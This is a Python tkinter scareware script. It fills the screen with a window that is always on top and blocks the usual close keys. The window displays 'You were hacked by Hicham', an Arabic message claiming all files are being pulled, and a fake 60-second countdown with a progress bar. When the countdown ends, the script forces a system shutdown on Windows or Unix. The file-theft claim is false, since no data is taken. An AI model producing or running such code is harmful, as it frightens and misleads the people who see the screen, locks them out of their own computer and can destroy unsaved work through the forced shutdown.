import tkinter as tk
import time
import random
import threading
import os


root = tk.Tk()
root.attributes('-fullscreen', True) 
root.attributes('-topmost', True) 
root.configure(bg='black')


root.bind("<Alt-F4>", lambda e: "break")
root.bind("<Escape>", lambda e: "break")
root.bind("<Control-w>", lambda e: "break")


devil_face = tk.Label(root, text="""
        .-'`-.
       /  .--. \\
      /  /    \\  \\
     |   |    |   |
     |   |    |   |   /\\
     |   |    |   |  /  \\
     |   |    |   |  \\  /
     |   |    |   |   \\/
     |   |    |   |    
      \\_|____|_/
       `----'      
      """, font=("Courier", 25), fg="red", bg="black", justify="center")
devil_face.pack(pady=50)


hack_text = tk.Label(root, text="You were hacked by Hicham", font=("Arial", 30, "bold"), fg="red", bg="black")
hack_text.place(x=0, y=0)


countdown_label = tk.Label(root, text="00:00", font=("Arial", 30, "bold"), fg="white", bg="black")
countdown_label.place(x=50, y=20)

loading_label = tk.Label(root, text="تتم سحب جميع ملفاتك", font=("Arial", 20, "bold"), fg="white", bg="black")
loading_label.place(x=50, y=70)


progress_bar = tk.Label(root, text="[                    ]", font=("Courier", 20, "bold"), fg="white", bg="black")
progress_bar.place(x=50, y=root.winfo_screenheight() - 100)


def move_devil_face():
    x, y = 100, 100
    direction_x, direction_y = 20, 20
    while True:
        x += direction_x
        y += direction_y
        if x >= root.winfo_screenwidth() - 200 or x <= 0:
            direction_x *= -1
        if y >= root.winfo_screenheight() - 100 or y <= 0:
            direction_y *= -1
        devil_face.place(x=x, y=y)
        root.update()
        time.sleep(0.02)


def countdown_and_loading():
    total_time = 60  
    for remaining in range(total_time, -1, -1):
        minutes, seconds = divmod(remaining, 60)
        countdown_label.config(text=f"{minutes:02}:{seconds:02}")


        progress = int(((total_time - remaining) / total_time) * 100)
        progress_bar.config(text=f"[{'=' * (progress // 5)}{' ' * (20 - progress // 5)}] {progress}%")


        loading_label.config(text="تتم سحب جميع ملفاتك"[::-1]) 
        
        root.update()
        time.sleep(1)
    

    shutdown()


def shutdown():
    if os.name == "nt":
        os.system("shutdown /s /t 5")  
    else:
        os.system("shutdown -h now")  


threading.Thread(target=move_devil_face, daemon=True).start()


threading.Thread(target=countdown_and_loading, daemon=True).start()

root.mainloop()
